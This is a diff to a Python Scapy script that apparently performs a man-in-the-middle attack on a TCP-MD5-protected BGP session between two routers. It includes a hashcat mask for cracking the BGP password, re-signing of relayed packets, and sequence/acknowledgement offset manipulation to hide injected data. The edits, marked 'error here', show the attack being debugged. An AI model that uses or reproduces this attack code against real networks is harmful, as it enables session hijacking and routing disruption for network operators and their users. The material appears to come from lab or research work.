@@ -17,6 +17,7 @@ INTERFACE_R2 = "eth1"
 LAST_SIGNED_PACKET = None
 ATTACK_STARTED = False
 OFFSET = 52
+FIRST_ACK = True
 
 hashcat_mask = "-1 ?u?l -2 ?u?l?d ?1?1?1?1?1?1?1?1 --increment --increment-min 4"
 IP_TARGET = "192.168.12.1"
@@ -152,20 +153,25 @@ def packet_callback(captured_packet):
 def callback(pkt):
     # print('recieved ,' from' + pkt.sniffed_on)
     global LAST_SIGNED_PACKET
+    global FIRST_ACK
     if pkt[Ether].dst == 'c4:01:7b:00:00:00':
         LAST_SIGNED_PACKET = pkt
     if pkt.sniffed_on == "eth0":
         pp = pkt.copy()
         pp.show2()
-        if pp[Ether].dst == 'c4:02:7b:0f:00:00': #or pp[Ether].dst == 'ff:ff:ff:ff:ff:ff':  # so we don't read the same packet that we craft :)
+        if  pp[Ether].dst == 'c4:02:7b:0f:00:00': #or pp[Ether].dst == 'ff:ff:ff:ff:ff:ff':  # so we don't read the same packet that we craft :)
             if not ATTACK_STARTED:
                 print('attack not started, sending to R2')
                 sendp(pp, iface="eth1")
             else:
                 # sending to eth1 R2 - subtract the seq and ack?
+                if (pp[TCP].flags & 0x10) and (FIRST_ACK):
+                    FIRST_ACK = False
+                    pp.display()
+                    return 0
                 print('attack started, sending to R2')
-                pp[TCP].seq -= OFFSET
-                pp[TCP].ack -= OFFSET
+                #pp[TCP].seq -= OFFSET
+                pp[TCP].ack -= OFFSET # error here
                 pp.show2()
                 signed_packet = sign_single_packet(pp, BGP_password)
                 # recompute packet to compute checksums
@@ -183,7 +189,7 @@ def callback(pkt):
                 # sending to eth1 R2 - add the seq and ack?
                 print('attack started, sending to R1')
                 pp[TCP].seq += OFFSET
-                pp[TCP].ack += OFFSET
+                #pp[TCP].ack += OFFSET # error here
                 pp.show2()
                 signed_packet = sign_single_packet(pp, BGP_password)
                 # recompute packet to compute checksums
